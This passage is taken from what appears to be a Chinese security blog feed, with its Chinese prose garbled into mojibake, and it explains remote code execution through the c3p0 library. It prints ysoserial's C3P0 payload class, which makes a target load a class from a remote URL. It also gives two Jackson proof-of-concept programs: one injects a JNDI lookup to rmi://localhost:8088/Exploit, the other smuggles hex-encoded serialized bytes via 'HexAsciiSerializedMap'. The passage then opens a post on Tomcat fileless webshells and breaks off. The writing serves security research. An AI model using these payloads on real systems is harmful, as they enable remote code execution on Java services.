class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.PoolBackedDataSource;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * com.sun.jndi.rmi.registry.RegistryContext-&gt;lookup</span></span><br><span class="line"><span class="comment"> * com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized-&gt;getObject</span></span><br><span class="line"><span class="comment"> * com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase-&gt;readObject</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Arguments:</span></span><br><span class="line"><span class="comment"> * - base_url:classname</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Yields:</span></span><br><span class="line"><span class="comment"> * - Instantiation of remotely loaded class</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> mbechler</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@PayloadTest</span> ( harness=<span class="string">"ysoserial.test.payloads.RemoteClassLoadingTest"</span> )</span><br><span class="line"><span class="meta">@Dependencies</span>( &#123; <span class="string">"com.mchange:c3p0:0.9.5.2"</span> ,<span class="string">"com.mchange:mchange-commons-java:0.2.11"</span>&#125; )</span><br><span class="line"><span class="meta">@Authors</span>(&#123; Authors.MBECHLER &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">C3P0</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">( String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sep = command.lastIndexOf(<span class="string">':'</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Command format is: &lt;base_url&gt;:&lt;classname&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String url = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        String className = command.substring(sep + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PoolSource</span> <span class="keyword">implements</span> <span class="title">ConnectionPoolDataSource</span>, <span class="title">Referenceable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String className;</span><br><span class="line">        <span class="keyword">private</span> String url;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">PoolSource</span> <span class="params">( String className, String url )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.className = className;</span><br><span class="line">            <span class="keyword">this</span>.url = url;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Reference <span class="title">getReference</span> <span class="params">()</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Reference(<span class="string">"exploit"</span>, <span class="keyword">this</span>.className, <span class="keyword">this</span>.url);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> PrintWriter <span class="title">getLogWriter</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLogWriter</span> <span class="params">( PrintWriter out )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLoginTimeout</span> <span class="params">( <span class="keyword">int</span> seconds )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLoginTimeout</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Logger <span class="title">getParentLogger</span> <span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">( String user, String password )</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        PayloadRunner.run(C3P0<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>connectionPoolDataSourceæ˜¯PoolSourceï¼Œä½†æ˜¯PoolSourceæ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£ï¼Œæ‰€ä»¥ä¼šåœ¨PoolBackedDataSourceæ—¶è¿›å…¥åˆ°catchå—ä¸­ã€‚<br><img src="1586157998304-98f88cb3-35d4-4b17-b735-a381447d3604.png#align=left&display=inline&height=298&margin=%5Bobject%20Object%5D&name=image.png&originHeight=596&originWidth=2822&size=175522&status=done&style=none&width=1411" alt="image.png"></p><p><img src="1586157880994-1fe1db61-f3a5-45a3-a591-4af5ef5cee26.png#align=left&display=inline&height=628&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1256&originWidth=1514&size=146157&status=done&style=none&width=757" alt="image.png"></p><p><img src="1586157739966-f17e2977-5809-47de-ae93-56a634a2ae63.png#align=left&display=inline&height=390&margin=%5Bobject%20Object%5D&name=image.png&originHeight=780&originWidth=2348&size=199375&status=done&style=none&width=1174" alt="image.png"></p><p>catchå—ä¸­è°ƒç”¨indirector.indirectForm(this.connectionPoolDataSource)ä¼šæŠŠReferenceableç±»å‹æ”¾åˆ°ReferenceSerializedä¸­å¹¶è¿›è¡Œåºåˆ—åŒ–ã€‚<br><img src="1586158218862-65b4fe36-0548-40a6-9243-67d6716739ed.png#align=left&display=inline&height=350&margin=%5Bobject%20Object%5D&name=image.png&originHeight=700&originWidth=2474&size=144888&status=done&style=none&width=1237" alt="image.png"></p><p>åœ¨ååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨ReferenceSerializedçš„getObjectæ–¹æ³•ï¼Œå‘http baseè¯·æ±‚ç±»<br><img src="1586158470733-c79c8427-b1d3-482d-8082-c8b9c4e4b3b1.png#align=left&display=inline&height=194&margin=%5Bobject%20Object%5D&name=image.png&originHeight=388&originWidth=2014&size=79716&status=done&style=none&width=1007" alt="image.png"></p><p><img src="1586158529333-efc7783e-8941-45de-9242-b6b5043e49a9.png#align=left&display=inline&height=485&margin=%5Bobject%20Object%5D&name=image.png&originHeight=970&originWidth=2208&size=195296&status=done&style=none&width=1104" alt="image.png"></p><p><img src="1586158599877-ad23b7dc-9541-416e-8563-ea92e0a0f47c.png#align=left&display=inline&height=387&margin=%5Bobject%20Object%5D&name=image.png&originHeight=774&originWidth=2164&size=167546&status=done&style=none&width=1082" alt="image.png"></p><h2 id="jndi-æ³¨å…¥"><a href="#jndi-æ³¨å…¥" class="headerlink" title="jndi æ³¨å…¥"></a>jndi æ³¨å…¥</h2><p>PoolBackedDataSourceBase<br><img src="1586157023673-1ba52779-d0e1-4e31-a9e3-a92873f39dfe.png#align=left&display=inline&height=470&margin=%5Bobject%20Object%5D&name=image.png&originHeight=940&originWidth=2002&size=188137&status=done&style=none&width=1001" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatePoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String poc = <span class="string">"&#123;\"object\":[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",&#123;\"jndiName\":\"rmi://localhost:8088/Exploit\", \"loginTimeout\":0&#125;]&#125;"</span>;</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        objectMapper.readValue(poc, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] toByteArray(InputStream in) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] classBytes;</span><br><span class="line">        classBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[in.available()];</span><br><span class="line">        in.read(classBytes);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> classBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bytesToHexString</span><span class="params">(<span class="keyword">byte</span>[] bArray, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer(length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            String sTemp = Integer.toHexString(<span class="number">255</span> &amp; bArray[i]);</span><br><span class="line">            <span class="keyword">if</span> (sTemp.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                sb.append(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(sTemp.toUpperCase());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1586746951558-7748fb17-b819-4eaa-9aa9-edff94e8bd90.png#align=left&display=inline&height=243&margin=%5Bobject%20Object%5D&name=image.png&originHeight=486&originWidth=1944&size=127935&status=done&style=none&width=972" alt="image.png"></p><p><img src="1586747039311-88d990d3-4b87-4570-b33b-b32b0e9bbcd5.png#align=left&display=inline&height=256&margin=%5Bobject%20Object%5D&name=image.png&originHeight=512&originWidth=2204&size=101206&status=done&style=none&width=1102" alt="image.png"></p><p><img src="1586747042329-d08d3f11-8212-4e27-b5db-692d2fd316af.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&name=image.png&originHeight=488&originWidth=1320&size=68944&status=done&style=none&width=746" alt="image.png"></p><p><img src="1586747066747-72ba5789-3d66-407b-a184-8b672916fe76.png#align=left&display=inline&height=280&margin=%5Bobject%20Object%5D&name=image.png&originHeight=560&originWidth=2200&size=145105&status=done&style=none&width=1100" alt="image.png"></p><h2 id="hexåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨"><a href="#hexåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨" class="headerlink" title="hexåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨"></a>hexåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨</h2><p><img src="1586157043057-ea21e78c-b10c-4f83-9dd5-198c1a5b6ae1.png#align=left&display=inline&height=451&margin=%5Bobject%20Object%5D&name=image.png&originHeight=902&originWidth=2004&size=179448&status=done&style=none&width=1002" alt="image.png"><br><img src="1586157060893-23a3eaed-43e6-43b6-89b5-21803abfe30f.png#align=left&display=inline&height=335&margin=%5Bobject%20Object%5D&name=image.png&originHeight=670&originWidth=1976&size=153585&status=done&style=none&width=988" alt="image.png"></p><p>åœ¨ä¸€äº›éåŸç”Ÿçš„ååºåˆ—åŒ–ï¼ˆå¦‚jacksonï¼‰çš„æƒ…å†µä¸‹ï¼Œc3p0å¯ä»¥åšåˆ°ä¸å‡ºç½‘åˆ©ç”¨ã€‚å…¶åŸç†æ˜¯åˆ©ç”¨jacksonçš„ååºåˆ—åŒ–æ—¶è°ƒç”¨userOverridesAsStringçš„setterï¼Œåœ¨setterä¸­è¿è¡Œè¿‡ç¨‹ä¸­ä¼šæŠŠä¼ å…¥çš„ä»¥HexAsciiSerializedMapå¼€å¤´çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç å¹¶è§¦å‘åŸç”Ÿååºåˆ—åŒ–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatePoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        InputStream in = <span class="keyword">new</span> FileInputStream(<span class="string">"/Users/cengsiqi/Desktop/test.ser"</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] data = toByteArray(in);</span><br><span class="line">        in.close();</span><br><span class="line">        String HexString = bytesToHexString(data, data.length);</span><br><span class="line">        String poc = <span class="string">"&#123;\"object\":[\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",&#123;\"userOverridesAsString\":\"HexAsciiSerializedMap:"</span>+ HexString + <span class="string">";\"&#125;]&#125;"</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        objectMapper.readValue(poc, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] toByteArray(InputStream in) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] classBytes;</span><br><span class="line">        classBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[in.available()];</span><br><span class="line">        in.read(classBytes);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> classBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bytesToHexString</span><span class="params">(<span class="keyword">byte</span>[] bArray, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer(length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            String sTemp = Integer.toHexString(<span class="number">255</span> &amp; bArray[i]);</span><br><span class="line">            <span class="keyword">if</span> (sTemp.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                sb.append(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sb.append(sTemp.toUpperCase());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•è·Ÿè¸ªä¸€ä¸‹ï¼Œè¿›å…¥setteræ–¹æ³•ã€‚<br><img src="1586744313296-ca6b14b1-4297-4f09-a344-563ba85cf168.png#align=left&display=inline&height=363&margin=%5Bobject%20Object%5D&name=image.png&originHeight=726&originWidth=2460&size=210573&status=done&style=none&width=1230" alt="image.png"></p><p>ç”±parseUserOverridesAsStringå¯¹å­—ç¬¦ä¸²è¿›è¡Œå¤„ç†<br><img src="1586744361091-dae2b1e6-349a-4863-8c80-bcd9fe960f07.png#align=left&display=inline&height=1332&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1332&originWidth=2568&size=442605&status=done&style=none&width=2568" alt="image.png"></p><p>æå–HexAsciiSerializedMapä¹‹åçš„ä¸œè¥¿<br><img src="1586744421955-161d66ba-096b-4df9-97a4-9bb506f94f07.png#align=left&display=inline&height=185&margin=%5Bobject%20Object%5D&name=image.png&originHeight=370&originWidth=2528&size=123596&status=done&style=none&width=1264" alt="image.png"></p><p>æœ€åç”±fromByteArrayä¸­çš„deserializeFromByteArrayè¿›è¡Œååºåˆ—åŒ–<br><img src="1586744477494-4055d369-1a34-49f3-9836-091d4471928c.png#align=left&display=inline&height=100&margin=%5Bobject%20Object%5D&name=image.png&originHeight=200&originWidth=2244&size=67588&status=done&style=none&width=1122" alt="image.png"></p><p><img src="1586744495756-bf0a1af2-742b-49ad-90e5-e926633529be.png#align=left&display=inline&height=124&margin=%5Bobject%20Object%5D&name=image.png&originHeight=248&originWidth=2250&size=65436&status=done&style=none&width=1125" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      é™¤äº†å¸¸è§çš„http baseä¹‹å¤–ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹c3p0å¯ä»¥ä½¿ç”¨jndiå’Œhexåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨æ¥è¿›è¡Œrceã€‚
    
    </summary>
    
    
      <category term="web security" scheme="https://cl0und.github.io/categories/web-security/"/>
    
    
      <category term="java" scheme="https://cl0und.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>tomcatä¸å‡ºç½‘å›æ˜¾è¿ç»­å‰§ç¬¬å…­é›†</title>
    <link href="https://cl0und.github.io/2020/04/09/tomcat%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E8%BF%9E%E7%BB%AD%E5%89%A7%E7%AC%AC%E5%85%AD%E9%9B%86/"/>
    <id>https://cl0und.github.io/2020/04/09/tomcat%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E8%BF%9E%E7%BB%AD%E5%89%A7%E7%AC%AC%E5%85%AD%E9%9B%86/</id>
    <published>2020-04-09T06:43:48.000Z</published>
    <updated>2020-07-11T08:03:54.407Z</updated>
    
    <content type="html"><![CDATA[<!-- ç¦»å¤§ç»“å±€åˆè¿›äº†ä¸€æ­¥ --><!-- more --><p>é¦–å‘äº<a href="https://xz.aliyun.com/t/7535">å…ˆçŸ¥ç¤¾åŒº</a></p><h2 id="å‰æƒ…æè¦"><a href="#å‰æƒ…æè¦" class="headerlink" title="å‰æƒ…æè¦"></a>å‰æƒ…æè¦</h2><p>è¿™å‘¨å›é¡¾äº†ä¸€ä¸‹æˆ‘çœ‹åˆ°çš„å‰äººå…³äºtomcatå›æ˜¾å’Œæ— æ–‡ä»¶webshellçš„æ–‡ç« ã€‚å‘ç°å„ä¸ªå¸ˆå‚…çš„æ–¹æ³•å„æœ‰ä¼˜åŠ£ï¼Œä¸‹é¢ç®€å•æ€»ç»“ä¸€ä¸‹ï¼ˆæ€»ç»“ä¸å¯¹çš„åœ°æ–¹è¿˜è¯·å„ä½å¸ˆå‚…æŒ‡å‡ºï¼‰ã€‚</p><ul><li><a href="https://www.anquanke.com/post/id/198886">åŸºäºå†…å­˜ Webshell çš„æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ç ”ç©¶</a>ï¼Œè§‚æ˜Ÿå¤§å“¥çš„æ–‡ç« ï¼Œé€šæ€springï¼Œèƒ½è§£å†³å®æˆ˜åªèƒ½å¤Ÿé‡åˆ°çš„å¤§éƒ¨åˆ†æƒ…å†µäº†ã€‚</li><li><a href="https://xz.aliyun.com/t/7348">Tomcatä¸­ä¸€ç§åŠé€šç”¨å›æ˜¾æ–¹æ³•</a>ï¼Œè¿™ç¯‡æ–‡ç« è®²äº†é€šè¿‡åå°„ä¿®æ”¹ApplicationFilterChainå‚æ•°æ¥è®©tomcatå†ä¸‹ä¸€æ¬¡è¯·æ±‚çš„æ—¶å€™åœ¨çº¿ç¨‹ä¸­ç¼“å­˜reqå’Œrespï¼Œä¸è¶³ä¹‹å¤„åœ¨äºshiroæ— æ³•å›æ˜¾ã€‚</li><li><a href="https://xz.aliyun.com/t/7388">åŸºäºtomcatçš„å†…å­˜ Webshell æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯</a>ï¼Œé€šè¿‡ä¸Šä¸€ç¯‡çš„æ–¹æ³•è·å–åˆ°reqè¿›ä¸€æ­¥è·å–contextï¼Œç„¶ååŠ¨æ€æ³¨å†Œfilterï¼Œä¸è¶³ä¹‹å¤„åœ¨äºä½¿ç”¨çš„æ˜¯ä¸Šä¸€ç¯‡çš„è·å–reqçš„æ€è·¯æ‰€ä»¥ä¹Ÿæ— æ³•shiroå›æ˜¾ã€‚</li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">åŸºäºå…¨å±€å‚¨å­˜çš„æ–°æ€è·¯ | Tomcatçš„ä¸€ç§é€šç”¨å›æ˜¾æ–¹æ³•ç ”ç©¶</a>ï¼Œè¿™ç¯‡æ–‡ç« é€šè¿‡currentThread.getContextClassLoader()è·å–StandardContextï¼Œè¿›ä¸€æ­¥è·å–åˆ°responseï¼Œè§£å†³äº†shiroå›æ˜¾çš„é—®é¢˜ï¼Œä¸è¶³åœ¨äºtomcat7ä¸­æ— æ³•è·å–åˆ°StandardContextã€‚</li><li><a href="https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA">åŸºäºTomcatæ— æ–‡ä»¶Webshellç ”ç©¶</a>ï¼Œæ€»ç»“ä¸Šé¢æ–‡ç« çš„æ–¹æ³•ï¼Œä¸è¶³ä¹‹å¤„åœ¨äºæ— æ³•è§£å†³tomcat7+shiroçš„é—®é¢˜ã€‚</li></ul><p>æ‰€ä»¥è¿™é‡Œæå‡ºä¸€ç§æ–°çš„å›æ˜¾æ–¹æ¡ˆè§£å†³ä¸€ä¸‹tomcat7+shiroè¿™ä¸ªé˜´æš—çš„è§’è½ï¼ˆç»æµ‹è¯•tomcat8ä»ç„¶é€‚ç”¨ï¼‰ã€‚<br>æµ‹è¯•ç¯å¢ƒï¼šmacos+tomcat7,8+shiro-simple-web</p><h2 id="å†çœ‹register"><a href="#å†çœ‹register" class="headerlink" title="å†çœ‹register"></a>å†çœ‹register</h2><p>åœ¨ä¸Šé¢æåˆ°çš„ç¬¬å››ç¯‡æ–‡ç« ä¸­æåˆ°åŒ…å«æœ‰requestï¼ˆæœ‰äº†requestå°±æœ‰responseï¼‰çš„rpä¼šè¢«å‚¨å­˜åœ¨globalä¸­ï¼Œä½†å…¶å®å†å¾€ä¸‹çœ‹ä¼šå‘ç°rpè¢«æ³¨å†Œè¿›äº†ç»„ä»¶ã€‚<br><img src="1585579573873-fde8907a-d8ea-4418-8fb8-4f2f24c5854b.png#align=left&display=inline&height=413&name=image.png&originHeight=826&originWidth=2868&size=245974&status=done&style=none&width=1434" alt="image.png"><br>æ—¢ç„¶æ³¨å†Œè¿›å»äº†è‚¯å®šå­˜æ”¾åœ¨å“ªé‡Œçš„ï¼Œæ¥ä¸‹æ¥åŠ¨é™ç»“åˆè°ƒä»£ç 